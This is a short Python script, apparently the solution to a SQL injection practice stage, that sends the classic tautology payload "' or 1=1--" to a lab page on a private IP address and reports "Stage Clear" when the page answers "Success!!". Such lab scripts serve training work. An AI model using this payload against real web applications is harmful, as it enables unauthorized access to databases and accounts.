import requests

URL = "http://192.168.81.129/sqli/sqli1.php"
PAYLOAD = "?uid=%27%20or%201=1--%09-"

resp = requests.get(URL + PAYLOAD)


if resp.text.find('Success!!') > 0:
    print('Stage Clear')
else:
    print('Not yet')